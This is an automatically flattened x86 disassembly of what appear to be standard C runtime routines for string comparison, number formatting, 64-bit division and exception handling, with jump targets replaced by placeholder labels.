cmp eax 0x5a
ja r-xdata
add eax 0x20
movzx esi ax
jmp r-xdata
cmp si ax
je r-xdata
add eax 0x20
movzx eax ax
movzx eax [ edi ]
cmp eax 0x41
jb r-xdata
movzx eax [ ebx + edi ]
cmp eax 0x41
jb r-xdata
jmp r-xdata
sub_1001a965
mov edi edi
push ebp
mov ebp esp
cmp [ rw-data ] 0x0
push esi
jne r-xdata
push 0x0
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_1001a862
add esp 0xc
mov esi [ ebp + 0x8 ]
test esi esi
jne r-xdata
mov ecx [ ebp + 0xc ]
test ecx ecx
je r-xdata
call sub_10015c7f
mov [ eax ] 0x16
call sub_10015c2d
mov eax 0x7fffffff
jmp r-xdata
sub esi ecx
pop esi
pop ebp
retn
mov edx eax
cmp eax 0x5a
ja r-xdata
add ecx 0x2
test dx dx
je r-xdata
cmp eax 0x5a
ja r-xdata
add eax 0x20
movzx edx ax
jmp r-xdata
movzx ecx ax
movzx eax dx
sub eax ecx
jmp r-xdata
cmp dx ax
je r-xdata
add eax 0x20
movzx eax ax
movzx eax [ ecx ]
cmp eax 0x41
jb r-xdata
movzx eax [ esi + ecx ]
cmp eax 0x41
jb r-xdata
sub_1001a9f0
mov edi edi
push ebp
mov ebp esp
cmp [ ebp + 0xc ] 0x0
je r-xdata
push esi
mov esi ecx
mov [ ecx ] 0x2d
inc ecx
neg eax
add dl 0x30
add dl 0x57
jmp r-xdata
xor edx edx
div [ ebp + 0x8 ]
cmp edx 0x9
jbe r-xdata
mov [ ecx ] al
dec ecx
mov [ ecx ] dl
inc ecx
test eax eax
jne r-xdata
mov dl [ esi ]
mov al [ ecx ]
mov [ ecx ] dl
dec ecx
mov [ esi ] al
inc esi
cmp esi ecx
jb r-xdata
pop esi
pop ebp
retn 0x8
sub_1001aa33
mov edi edi
push ebp
mov ebp esp
cmp [ ebp + 0x10 ] 0xa
mov eax [ ebp + 0x8 ]
jne r-xdata
push 0x0
push [ ebp + 0x10 ]
test eax eax
jns r-xdata
push 0x1
push 0xa
jmp r-xdata
mov ecx [ ebp + 0xc ]
call sub_1001a9f0
mov eax [ ebp + 0xc ]
pop ebp
retn
sub_1001aa5d
mov edi edi
push ebp
mov ebp esp
mov eax 0xffff
sub esp 0x14
cmp [ ebp + 0x8 ] ax
je r-xdata
leave
retn
push ebx
push esi
push [ ebp + 0xc ]
lea ecx [ ebp - 0x14 ]
call sub_10013009
mov esi [ ebp - 0x14 ]
mov ecx [ esi + 0x14 ]
xor ebx ebx
cmp ecx ebx
jne r-xdata
mov eax 0x100
push 0x1
cmp [ ebp + 0x8 ] ax
jae r-xdata
mov eax [ ebp + 0x8 ]
lea ecx [ eax - 0x41 ]
cmp cx 0x19
ja r-xdata
lea edx [ ebp - 0x4 ]
push edx
push 0x1
lea edx [ ebp + 0x8 ]
push edx
push eax
push ecx
call sub_1001aafd
add esp 0x18
test eax eax
movzx eax [ ebp + 0x8 ]
je r-xdata
push [ ebp + 0x8 ]
call sub_10019efa
pop ecx
test eax eax
movzx eax [ ebp + 0x8 ]
pop ecx
je r-xdata
movzx eax ax
jmp r-xdata
add ax 0x20
cmp [ ebp - 0x8 ] bl
je r-xdata
movzx eax [ ebp - 0x4 ]
mov ecx [ esi + 0xcc ]
movzx eax [ ecx + eax ]
jmp r-xdata
pop esi
pop ebx
mov ecx [ ebp - 0xc ]
and [ ecx + 0x70 ] 0xfffffffd
sub_1001aafd
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x14 ]
test eax eax
jle r-xdata
push [ ebp + 0x1c ]
push [ ebp + 0x18 ]
push eax
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call [ LCMapStringW@IAT ]
pop ebp
retn
push eax
push [ ebp + 0x10 ]
call sub_1001ab2c
pop ecx
pop ecx
sub_1001ab2c
mov edi edi
push ebp
mov ebp esp
xor eax eax
cmp [ ebp + 0xc ] eax
jbe r-xdata
pop ebp
retn
mov ecx [ ebp + 0x8 ]
inc eax
add ecx 0x2
cmp eax [ ebp + 0xc ]
jb r-xdata
cmp [ ecx ] 0x0
je r-xdata
sub_1001ab4c
mov edi edi
push ebp
mov ebp esp
push ecx
push ebx
mov eax [ ebp + 0xc ]
add eax 0xc
mov [ ebp - 0x4 ] eax
mov ebx [ fs : 0x0 ]
mov eax [ ebx ]
mov [ fs : 0x0 ] eax
mov eax [ ebp + 0x8 ]
mov ebx [ ebp + 0xc ]
mov ebp [ ebp - 0x4 ]
mov esp [ ebx - 0x4 ]
jmp eax
sub_1001ab85
mov edi edi
push ebp
mov ebp esp
push ecx
push ecx
push ebx
push esi
push edi
mov esi [ fs : 0x0 ]
mov [ ebp - 0x4 ] esi
mov [ ebp - 0x8 ] r-xdata
push 0x0
push [ ebp + 0xc ]
push [ ebp - 0x8 ]
push [ ebp + 0x8 ]
call RtlUnwind
mov eax [ ebp + 0xc ]
mov eax [ eax + 0x4 ]
and eax 0xfffffffd
mov ecx [ ebp + 0xc ]
mov [ ecx + 0x4 ] eax
mov edi [ fs : 0x0 ]
mov ebx [ ebp - 0x4 ]
mov [ ebx ] edi
mov [ fs : 0x0 ] ebx
pop edi
pop esi
pop ebx
leave
retn 0x8
sub_1001abd9
push ebp
mov ebp esp
sub esp 0x8
push ebx
push esi
push edi
cld
mov [ ebp - 0x4 ] eax
xor eax eax
push eax
push eax
push eax
push [ ebp - 0x4 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_1001bbd1
add esp 0x20
mov [ ebp - 0x8 ] eax
pop edi
pop esi
pop ebx
mov eax [ ebp - 0x8 ]
mov esp ebp
pop ebp
retn
sub_1001ac0f
mov edi edi
push ebp
mov ebp esp
push esi
cld
mov esi [ ebp + 0xc ]
mov ecx [ esi + 0x8 ]
xor ecx esi
call sub_10012771
push 0x0
push esi
push [ esi + 0x14 ]
push [ esi + 0xc ]
push 0x0
push [ ebp + 0x10 ]
push [ esi + 0x10 ]
push [ ebp + 0x8 ]
call sub_1001bbd1
add esp 0x20
pop esi
pop ebp
retn
sub_1001ac42
mov edi edi
push ebp
mov ebp esp
sub esp 0x38
push ebx
cmp [ ebp + 0x8 ] 0x123
jne r-xdata
and [ ebp - 0x28 ] 0x0
mov [ ebp - 0x24 ] sub_1001ad19
mov eax [ rw-data ]
lea ecx [ ebp - 0x28 ]
xor eax ecx
mov [ ebp - 0x20 ] eax
mov eax [ ebp + 0x18 ]
mov [ ebp - 0x1c ] eax
mov eax [ ebp + 0xc ]
mov [ ebp - 0x18 ] eax
mov eax [ ebp + 0x1c ]
mov [ ebp - 0x14 ] eax
mov eax [ ebp + 0x20 ]
mov [ ebp - 0x10 ] eax
and [ ebp - 0xc ] 0x0
and [ ebp - 0x8 ] 0x0
and [ ebp - 0x4 ] 0x0
mov [ ebp - 0xc ] esp
mov [ ebp - 0x8 ] ebp
mov eax [ fs : 0x0 ]
mov [ ebp - 0x28 ] eax
lea eax [ ebp - 0x28 ]
mov [ fs : 0x0 ] eax
mov [ ebp - 0x38 ] 0x1
mov eax [ ebp + 0x8 ]
mov [ ebp - 0x34 ] eax
mov eax [ ebp + 0x10 ]
mov [ ebp - 0x30 ] eax
call sub_1001565c
mov eax [ eax + 0x80 ]
mov [ ebp - 0x2c ] eax
lea eax [ ebp - 0x34 ]
push eax
mov eax [ ebp + 0x8 ]
push [ eax ]
call [ ebp - 0x2c ]
pop ecx
pop ecx
and [ ebp - 0x38 ] 0x0
cmp [ ebp - 0x4 ] 0x0
je r-xdata
mov eax r-xdata
mov ecx [ ebp + 0xc ]
mov [ ecx ] eax
xor eax eax
inc eax
jmp r-xdata
mov eax [ ebp - 0x28 ]
mov [ fs : 0x0 ] eax
mov ebx [ fs : 0x0 ]
mov eax [ ebx ]
mov ebx [ ebp - 0x28 ]
mov [ ebx ] eax
mov [ fs : 0x0 ] ebx
jmp r-xdata
pop ebx
leave
retn
mov eax [ ebp - 0x38 ]
sub_1001ad19
mov edi edi
push ebp
mov ebp esp
push ecx
push ebx
cld
mov eax [ ebp + 0xc ]
mov ecx [ eax + 0x8 ]
xor ecx [ ebp + 0xc ]
call sub_10012771
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x4 ]
and eax 0x66
je r-xdata
push 0x1
mov eax [ ebp + 0xc ]
push [ eax + 0x18 ]
mov eax [ ebp + 0xc ]
push [ eax + 0x14 ]
mov eax [ ebp + 0xc ]
push [ eax + 0xc ]
push 0x0
push [ ebp + 0x10 ]
mov eax [ ebp + 0xc ]
push [ eax + 0x10 ]
push [ ebp + 0x8 ]
call sub_1001bbd1
add esp 0x20
mov eax [ ebp + 0xc ]
cmp [ eax + 0x24 ] 0x0
jne r-xdata
mov eax [ ebp + 0xc ]
mov [ eax + 0x24 ] 0x1
xor eax eax
inc eax
jmp r-xdata
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
lea eax [ ebp - 0x4 ]
push eax
push 0x123
call sub_1001ac42
add esp 0x1c
mov eax [ ebp - 0x4 ]
mov ebx [ ebp + 0xc ]
mov esp [ ebx + 0x1c ]
mov ebp [ ebx + 0x20 ]
jmp eax
push [ ebp + 0x8 ]
push [ ebp + 0xc ]
call sub_1001ab85
pop ebx
leave
retn
sub_1001adb8
mov edi edi
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov edi [ ebp + 0x8 ]
mov eax [ edi + 0x10 ]
mov esi [ edi + 0xc ]
mov [ ebp - 0x4 ] eax
mov ebx esi
jmp r-xdata
mov [ ebp + 0x8 ] esi
cmp esi 0xffffffff
jne r-xdata
mov eax [ ebp + 0x14 ]
inc esi
mov [ eax ] esi
mov eax [ ebp + 0x18 ]
mov [ eax ] ebx
cmp ebx [ edi + 0xc ]
ja r-xdata
mov ecx [ ebp + 0x10 ]
dec esi
mov eax esi
imul eax eax 0x14
add eax [ ebp - 0x4 ]
cmp [ eax + 0x4 ] ecx
jge r-xdata
call sub_10018050
call sub_10018050
cmp esi ebx
jbe r-xdata
cmp esi 0xffffffff
jne r-xdata
cmp ecx [ eax + 0x8 ]
jle r-xdata
mov eax esi
imul eax eax 0x14
add eax [ ebp - 0x4 ]
pop edi
pop esi
pop ebx
leave
retn
cmp [ ebp + 0xc ] 0x0
jge r-xdata
dec [ ebp + 0xc ]
mov ebx [ ebp + 0x8 ]
sub_1001ae2b
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0xc ]
push esi
mov esi [ ebp + 0x8 ]
mov [ esi ] eax
call sub_1001565c
mov eax [ eax + 0x98 ]
mov [ esi + 0x4 ] eax
call sub_1001565c
mov [ eax + 0x98 ] esi
mov eax esi
pop esi
pop ebp
retn
sub_1001ae57
mov edi edi
push ebp
mov ebp esp
call sub_1001565c
mov eax [ eax + 0x98 ]
jmp r-xdata
test eax eax
jne r-xdata
mov ecx [ eax ]
cmp ecx [ ebp + 0x8 ]
je r-xdata
inc eax
pop ebp
retn
xor eax eax
pop ebp
retn
mov eax [ eax + 0x4 ]
sub_1001ae7e
mov edi edi
push ebp
mov ebp esp
push esi
call sub_1001565c
mov esi [ ebp + 0x8 ]
cmp esi [ eax + 0x98 ]
jne r-xdata
call sub_1001565c
mov eax [ eax + 0x98 ]
jmp r-xdata
call sub_1001565c
mov ecx [ esi + 0x4 ]
mov [ eax + 0x98 ] ecx
cmp [ eax + 0x4 ] 0x0
jne r-xdata
mov ecx [ eax + 0x4 ]
cmp esi ecx
je r-xdata
pop esi
pop ebp
jmp sub_10018050
mov ecx [ esi + 0x4 ]
mov [ eax + 0x4 ] ecx
jmp r-xdata
mov eax ecx
pop esi
pop ebp
retn
sub_1001aed0
mov edi edi
push ebp
mov ebp esp
sub esp 0x18
mov eax [ rw-data ]
and [ ebp - 0x18 ] 0x0
lea ecx [ ebp - 0x18 ]
xor eax ecx
mov ecx [ ebp + 0x8 ]
mov [ ebp - 0x10 ] eax
mov eax [ ebp + 0xc ]
mov [ ebp - 0xc ] eax
mov eax [ ebp + 0x14 ]
inc eax
mov [ ebp - 0x14 ] sub_1001ac0f
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] eax
mov eax [ fs : 0x0 ]
mov [ ebp - 0x18 ] eax
lea eax [ ebp - 0x18 ]
mov [ fs : 0x0 ] eax
push [ ebp + 0x18 ]
push ecx
push [ ebp + 0x10 ]
call sub_1001bcc0
mov ecx eax
mov eax [ ebp - 0x18 ]
mov [ fs : 0x0 ] eax
mov eax ecx
leave
retn
sub_1001af30
push edi
push esi
push ebx
xor edi edi
mov eax [ esp + 0x14 ]
or eax eax
jge r-xdata
mov eax [ esp + 0x1c ]
or eax eax
jge r-xdata
inc edi
mov edx [ esp + 0x10 ]
neg eax
neg edx
sbb eax 0x0
mov [ esp + 0x14 ] eax
mov [ esp + 0x10 ] edx
or eax eax
jne r-xdata
inc edi
mov edx [ esp + 0x18 ]
neg eax
neg edx
sbb eax 0x0
mov [ esp + 0x1c ] eax
mov [ esp + 0x18 ] edx
mov ebx eax
mov ecx [ esp + 0x18 ]
mov edx [ esp + 0x14 ]
mov eax [ esp + 0x10 ]
mov ecx [ esp + 0x18 ]
mov eax [ esp + 0x14 ]
xor edx edx
div ecx
mov ebx eax
mov eax [ esp + 0x10 ]
div ecx
mov edx ebx
jmp r-xdata
shr ebx 0x1
rcr ecx 0x1
shr edx 0x1
rcr eax 0x1
or ebx ebx
jne r-xdata
div ecx
mov esi eax
mul [ esp + 0x1c ]
mov ecx eax
mov eax [ esp + 0x18 ]
mul esi
add edx ecx
jb r-xdata
dec edi
jne r-xdata
dec esi
cmp edx [ esp + 0x14 ]
ja r-xdata
pop ebx
pop esi
pop edi
retn 0x10
neg edx
neg eax
sbb edx 0x0
jb r-xdata
xor edx edx
mov eax esi
cmp eax [ esp + 0x10 ]
jbe r-xdata
sub_1001afe5
mov edi edi
push ebp
mov ebp esp
push esi
mov esi ecx
mov [ esi ] r--data
call sub_10012864
test [ ebp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
pop ebp
retn 0x4
push esi
call sub_10012c4b
pop ecx
sub_1001b00c
mov edi edi
push ebp
mov ebp esp
push esi
push edi
mov edi [ ebp + 0x8 ]
mov eax [ edi + 0x4 ]
test eax eax
je r-xdata
xor eax eax
inc eax
lea edx [ eax + 0x8 ]
cmp [ edx ] 0x0
je r-xdata
mov esi [ ebp + 0xc ]
mov ecx [ esi + 0x4 ]
cmp eax ecx
je r-xdata
test [ esi ] 0x2
je r-xdata
add ecx 0x8
push ecx
push edx
call sub_10013e80
pop ecx
pop ecx
test eax eax
je r-xdata
mov eax [ ebp + 0x10 ]
mov eax [ eax ]
test al 0x1
je r-xdata
test [ edi ] 0x8
je r-xdata
xor eax eax
jmp r-xdata
test al 0x2
je r-xdata
test [ edi ] 0x1
je r-xdata
pop edi
pop esi
pop ebp
retn
test [ edi ] 0x2
je r-xdata
sub_1001b06b
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov eax [ eax ]
mov eax [ eax ]
cmp eax 0xe0434352
je r-xdata
call sub_1001565c
cmp [ eax + 0x90 ] 0x0
jle r-xdata
cmp eax 0xe0434f4d
je r-xdata
xor eax eax
pop ebp
retn
call sub_1001565c
dec [ eax + 0x90 ]
cmp eax 0xe06d7363
jne r-xdata
call sub_1001565c
and [ eax + 0x90 ] 0x0
jmp sub_10018004
sub_1001b0ba
push 0x10
push r--data
call sub_100148a0
mov edi [ ebp + 0x10 ]
mov ebx [ ebp + 0x8 ]
cmp [ edi + 0x4 ] 0x80
jg r-xdata
mov esi [ ebx + 0x8 ]
movsx esi [ ebx + 0x8 ]
jmp r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
call sub_1001b17c
cmp esi [ ebp + 0x14 ]
je r-xdata
cmp esi 0xffffffff
jle r-xdata
mov [ ebp - 0x1c ] esi
call sub_1001565c
inc [ eax + 0x90 ]
and [ ebp - 0x4 ] 0x0
mov [ ebx + 0x8 ] esi
call sub_100148e5
retn
call sub_10018050
call sub_10018050
cmp esi [ edi + 0x4 ]
jl r-xdata
mov eax esi
mov ecx [ edi + 0x8 ]
mov esi [ ecx + eax * 8 ]
mov [ ebp - 0x20 ] esi
mov [ ebp - 0x4 ] 0x1
cmp [ ecx + eax * 8 + 0x4 ] 0x0
je r-xdata
and [ ebp - 0x4 ] 0x0
jmp r-xdata
mov [ ebx + 0x8 ] esi
push 0x103
push ebx
mov ecx [ edi + 0x8 ]
push [ ecx + eax * 8 + 0x4 ]
call sub_1001bcc0
mov [ ebp - 0x1c ] esi
jmp r-xdata
cmp esi [ ebp + 0x14 ]
je r-xdata
sub_1001b196
mov eax [ eax ]
cmp [ eax ] 0xe06d7363
jne r-xdata
xor eax eax
retn
cmp [ eax + 0x10 ] 0x3
jne r-xdata
mov ecx [ eax + 0x14 ]
cmp ecx 0x19930520
je r-xdata
cmp [ eax + 0x1c ] 0x0
jne r-xdata
cmp ecx 0x19930521
je r-xdata
call sub_1001565c
xor ecx ecx
inc ecx
mov [ eax + 0x20c ] ecx
mov eax ecx
retn
cmp ecx 0x19930522
jne r-xdata
sub_1001b1db
push 0x8
push r--data
call sub_100148a0
mov ecx [ ebp + 0x8 ]
test ecx ecx
je r-xdata
call sub_100148e5
retn
cmp [ ecx ] 0xe06d7363
jne r-xdata
mov eax [ ecx + 0x1c ]
test eax eax
je r-xdata
mov eax [ eax + 0x4 ]
test eax eax
je r-xdata
and [ ebp - 0x4 ] 0x0
push eax
push [ ecx + 0x18 ]
call sub_1001ab7e
mov [ ebp - 0x4 ] 0xfffffffe
sub_1001b230
mov edi edi
push ebp
mov ebp esp
mov ecx [ ebp + 0xc ]
mov eax [ ecx ]
push esi
mov esi [ ebp + 0x8 ]
add eax esi
cmp [ ecx + 0x4 ] 0x0
jl r-xdata
pop esi
pop ebp
retn
mov edx [ ecx + 0x4 ]
mov ecx [ ecx + 0x8 ]
mov esi [ edx + esi ]
mov ecx [ esi + ecx ]
add ecx edx
add eax ecx
sub_1001b259
mov edi edi
push ebp
mov ebp esp
sub esp 0xc
test edi edi
jne r-xdata
and [ ebp - 0x8 ] 0x0
cmp [ edi ] 0x0
mov [ ebp - 0x1 ] 0x0
jle r-xdata
call sub_10018050
mov al [ ebp - 0x1 ]
leave
retn
push ebx
push esi
inc [ ebp - 0x8 ]
mov eax [ ebp - 0x8 ]
cmp eax [ edi ]
jl r-xdata
mov eax [ ebp - 0x8 ]
shl eax 0x4
mov [ ebp - 0xc ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x1c ]
mov eax [ eax + 0xc ]
mov ebx [ eax ]
lea esi [ eax + 0x4 ]
test ebx ebx
jle r-xdata
pop esi
pop ebx
mov [ ebp - 0x1 ] 0x1
dec ebx
add esi 0x4
test ebx ebx
jg r-xdata
mov ecx [ ebp + 0x8 ]
push [ ecx + 0x1c ]
mov eax [ esi ]
push eax
mov eax [ edi + 0x4 ]
add eax [ ebp - 0xc ]
push eax
call sub_1001b00c
add esp 0xc
test eax eax
jne r-xdata
jmp r-xdata
sub_1001b31d
push 0x2c
push r--data
call sub_100148a0
mov ebx ecx
mov edi [ ebp + 0xc ]
mov esi [ ebp + 0x8 ]
mov [ ebp - 0x1c ] ebx
and [ ebp - 0x34 ] 0x0
mov eax [ edi - 0x4 ]
mov [ ebp - 0x24 ] eax
push [ esi + 0x18 ]
lea eax [ ebp - 0x3c ]
push eax
call sub_1001ae2b
pop ecx
pop ecx
mov [ ebp - 0x28 ] eax
call sub_1001565c
mov eax [ eax + 0x88 ]
mov [ ebp - 0x2c ] eax
call sub_1001565c
mov eax [ eax + 0x8c ]
mov [ ebp - 0x30 ] eax
call sub_1001565c
mov [ eax + 0x88 ] esi
call sub_1001565c
mov ecx [ ebp + 0x10 ]
mov [ eax + 0x8c ] ecx
and [ ebp - 0x4 ] 0x0
xor eax eax
inc eax
mov [ ebp + 0x10 ] eax
mov [ ebp - 0x4 ] eax
push [ ebp + 0x1c ]
push [ ebp + 0x18 ]
push ebx
push [ ebp + 0x14 ]
push edi
call sub_1001aed0
add esp 0x14
mov [ ebp - 0x1c ] eax
and [ ebp - 0x4 ] 0x0
jmp r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
mov [ ebp + 0x10 ] 0x0
call sub_1001b443
mov eax [ ebp - 0x1c ]
call sub_100148e5
retn
sub_1001b3b6
mov esp [ ebp - 0x18 ]
call sub_1001565c
and [ eax + 0x20c ] 0x0
mov esi [ ebp + 0x14 ]
mov edi [ ebp + 0xc ]
cmp [ esi + 0x4 ] 0x80
jg r-xdata
mov ecx [ edi + 0x8 ]
movsx ecx [ edi + 0x8 ]
jmp r-xdata
push ecx
push esi
push 0x0
push edi
call sub_1001b0ba
add esp 0x10
and [ ebp - 0x1c ] 0x0
and [ ebp - 0x4 ] 0x0
mov esi [ ebp + 0x8 ]
mov [ ebp - 0x4 ] 0xfffffffe
mov [ ebp + 0x10 ] 0x0
call sub_1001b443
mov eax [ ebp - 0x1c ]
call sub_100148e5
retn
imul eax eax 0x14
mov edx [ eax + ebx + 0x4 ]
cmp ecx edx
jle r-xdata
mov ebx [ esi + 0x10 ]
and [ ebp - 0x20 ] 0x0
inc [ ebp - 0x20 ]
jmp r-xdata
cmp ecx [ eax + ebx + 0x8 ]
jg r-xdata
mov eax [ ebp - 0x20 ]
cmp eax [ esi + 0xc ]
jae r-xdata
mov eax [ esi + 0x8 ]
mov ecx [ eax + edx * 8 + 0x8 ]
sub_1001b443
mov eax [ ebp - 0x24 ]
mov [ edi - 0x4 ] eax
push [ ebp - 0x28 ]
call sub_1001ae7e
pop ecx
call sub_1001565c
mov ecx [ ebp - 0x2c ]
mov [ eax + 0x88 ] ecx
call sub_1001565c
mov ecx [ ebp - 0x30 ]
mov [ eax + 0x8c ] ecx
cmp [ esi ] 0xe06d7363
jne r-xdata
retn
cmp [ esi + 0x10 ] 0x3
jne r-xdata
mov eax [ esi + 0x14 ]
cmp eax 0x19930520
je r-xdata
cmp [ ebp - 0x34 ] 0x0
jne r-xdata
cmp eax 0x19930521
je r-xdata
cmp [ ebp - 0x1c ] 0x0
je r-xdata
cmp eax 0x19930522
jne r-xdata
push [ esi + 0x18 ]
call sub_1001ae57
pop ecx
test eax eax
je r-xdata
push [ ebp + 0x10 ]
push esi
call sub_1001b1db
pop ecx
pop ecx
sub_1001b4b9
push 0xc
push r--data
call sub_100148a0
xor edx edx
mov [ ebp - 0x1c ] edx
mov eax [ ebp + 0x10 ]
mov ecx [ eax + 0x4 ]
cmp ecx edx
je r-xdata
xor eax eax
cmp [ ecx + 0x8 ] dl
je r-xdata
mov ecx [ eax + 0x8 ]
cmp ecx edx
jne r-xdata
mov eax [ eax ]
mov esi [ ebp + 0xc ]
test eax eax
js r-xdata
test [ eax ] 0x80000000
je r-xdata
mov [ ebp - 0x4 ] edx
xor ebx ebx
inc ebx
push ebx
test al 0x8
je r-xdata
lea esi [ ecx + esi + 0xc ]
mov edi [ ebp + 0x14 ]
mov eax [ ebp + 0x8 ]
push [ eax + 0x18 ]
test [ edi ] bl
je r-xdata
mov edi [ ebp + 0x8 ]
push [ edi + 0x18 ]
call sub_1001bd42
pop ecx
pop ecx
test eax eax
je r-xdata
cmp [ edi + 0x18 ] edx
jne r-xdata
call sub_1001bd42
pop ecx
pop ecx
test eax eax
je r-xdata
call sub_10018050
push ebx
push esi
call sub_1001bd42
pop ecx
pop ecx
test eax eax
je r-xdata
call sub_1001bd42
pop ecx
pop ecx
test eax eax
je r-xdata
call sub_1001bd42
pop ecx
pop ecx
test eax eax
je r-xdata
push ebx
push esi
call sub_1001bd42
pop ecx
pop ecx
test eax eax
je r-xdata
mov eax [ edi + 0x18 ]
mov [ esi ] eax
mov ecx [ ebp + 0x14 ]
add ecx 0x8
push ecx
push ebx
push esi
call sub_1001bd42
pop ecx
pop ecx
test eax eax
je r-xdata
push ebx
push esi
call sub_1001bd42
pop ecx
pop ecx
test eax eax
je r-xdata
push [ edi + 0x14 ]
mov eax [ ebp + 0x8 ]
push [ eax + 0x18 ]
push esi
call sub_100128c0
add esp 0xc
cmp [ edi + 0x14 ] 0x4
jne r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
mov eax [ ebp - 0x1c ]
jmp r-xdata
push [ edi + 0x18 ]
call sub_1001bd42
pop ecx
test eax eax
je r-xdata
push [ edi + 0x14 ]
add edi 0x8
push edi
mov eax [ ebp + 0x8 ]
push [ eax + 0x18 ]
call sub_1001b230
pop ecx
pop ecx
push eax
push esi
call sub_100128c0
add esp 0xc
jmp r-xdata
mov eax [ esi ]
test eax eax
je r-xdata
call sub_100148e5
retn
test [ edi ] 0x4
push 0x0
pop eax
setne al
inc eax
mov [ ebp - 0x1c ] eax
jmp r-xdata
add edi 0x8
push edi
jmp r-xdata
push eax
call sub_1001b230
pop ecx
pop ecx
mov [ esi ] eax
jmp r-xdata
sub_1001b638
push 0x8
push r--data
call sub_100148a0
mov eax [ ebp + 0x10 ]
test [ eax ] 0x80000000
je r-xdata
mov ecx [ eax + 0x8 ]
mov edx [ ebp + 0xc ]
lea ebx [ ecx + edx + 0xc ]
mov ebx [ ebp + 0xc ]
jmp r-xdata
lea eax [ esi + 0x8 ]
push eax
push [ edi + 0x18 ]
call sub_1001b230
pop ecx
pop ecx
push eax
push [ esi + 0x18 ]
push ebx
call sub_1001ab7e
dec eax
jne r-xdata
and [ ebp - 0x4 ] 0x0
mov esi [ ebp + 0x14 ]
push esi
push eax
push [ ebp + 0xc ]
mov edi [ ebp + 0x8 ]
push edi
call sub_1001b4b9
add esp 0x10
dec eax
je r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
call sub_100148e5
retn
push 0x1
lea eax [ esi + 0x8 ]
push eax
push [ edi + 0x18 ]
call sub_1001b230
pop ecx
pop ecx
push eax
push [ esi + 0x18 ]
push ebx
call sub_1001ab7e
jmp r-xdata
sub_1001b6ca
mov edi edi
push ebp
mov ebp esp
cmp [ ebp + 0x18 ] 0x0
je r-xdata
cmp [ ebp + 0x20 ] 0x0
push [ ebp + 0x8 ]
jne r-xdata
push [ ebp + 0x18 ]
push ebx
push esi
push [ ebp + 0x8 ]
call sub_1001b638
add esp 0x10
push [ ebp + 0x20 ]
push esi
jmp r-xdata
pop ebp
retn
push esi
push eax
call sub_1001ab4c
call sub_1001ab85
push [ edi ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push esi
call sub_1001b0ba
mov eax [ edi + 0x4 ]
push 0x100
push [ ebp + 0x1c ]
inc eax
push [ ebp + 0x14 ]
mov [ esi + 0x8 ] eax
push [ ebp + 0xc ]
mov ecx [ ebx + 0xc ]
push esi
push [ ebp + 0x8 ]
call sub_1001b31d
add esp 0x28
test eax eax
je r-xdata
sub_1001b738
mov edi edi
push ebp
mov ebp esp
sub esp 0xc
push esi
mov esi [ ebp + 0x8 ]
cmp [ esi ] 0x80000003
je r-xdata
pop esi
leave
retn
push edi
call sub_1001565c
cmp [ eax + 0x80 ] 0x0
je r-xdata
mov edi [ ebp + 0x18 ]
cmp [ edi + 0xc ] 0x0
jne r-xdata
call sub_1001565c
lea edi [ eax + 0x80 ]
call sub_100154ac
cmp [ edi ] eax
je r-xdata
mov esi [ ebp + 0x1c ]
lea eax [ ebp - 0xc ]
push eax
lea eax [ ebp - 0x4 ]
push eax
push esi
push [ ebp + 0x20 ]
push edi
call sub_1001adb8
mov ecx [ ebp - 0x4 ]
add esp 0x14
cmp ecx [ ebp - 0xc ]
jae r-xdata
call sub_10018050
mov eax [ esi ]
cmp eax 0xe0434f4d
je r-xdata
pop edi
add eax 0xc
mov [ ebp - 0x8 ] eax
push ebx
cmp eax 0xe0434352
je r-xdata
inc [ ebp - 0x4 ]
mov ecx [ ebp - 0x4 ]
add eax 0x14
mov [ ebp - 0x8 ] eax
cmp ecx [ ebp - 0xc ]
jb r-xdata
cmp esi [ eax - 0x8 ]
jg r-xdata
push [ ebp + 0x24 ]
push [ ebp + 0x20 ]
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push esi
call sub_1001ac42
add esp 0x1c
test eax eax
jne r-xdata
lea edi [ eax - 0xc ]
cmp esi [ edi ]
jl r-xdata
pop ebx
mov ecx [ eax ]
shl ecx 0x4
add ecx [ eax + 0x4 ]
mov edx [ ecx - 0xc ]
test edx edx
je r-xdata
lea ebx [ ecx - 0x10 ]
test [ ebx ] 0x40
jne r-xdata
cmp [ edx + 0x8 ] 0x0
jne r-xdata
push [ ebp + 0x24 ]
mov esi [ ebp + 0xc ]
push [ ebp + 0x20 ]
push 0x0
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0x8 ]
call sub_1001b6ca
mov esi [ ebp + 0x1c ]
mov eax [ ebp - 0x8 ]
add esp 0x1c
sub_1001b83f
mov edi edi
push ebp
mov ebp esp
sub esp 0x34
mov ecx [ ebp + 0xc ]
push ebx
mov ebx [ ebp + 0x18 ]
mov eax [ ebx + 0x4 ]
push esi
push edi
mov [ ebp - 0x1 ] 0x0
cmp eax 0x80
jg r-xdata
mov ecx [ ecx + 0x8 ]
movsx ecx [ ecx + 0x8 ]
jmp r-xdata
call sub_10018050
cmp ecx eax
jl r-xdata
mov [ ebp - 0x8 ] ecx
cmp ecx 0xffffffff
jl r-xdata
mov esi [ ebp + 0x8 ]
mov edi 0xe06d7363
cmp [ esi ] edi
jne r-xdata
cmp [ ebx + 0xc ] 0x0
jbe r-xdata
cmp [ esi + 0x10 ] 0x3
mov ebx 0x19930520
jne r-xdata
call sub_1001565c
cmp [ eax + 0x94 ] 0x0
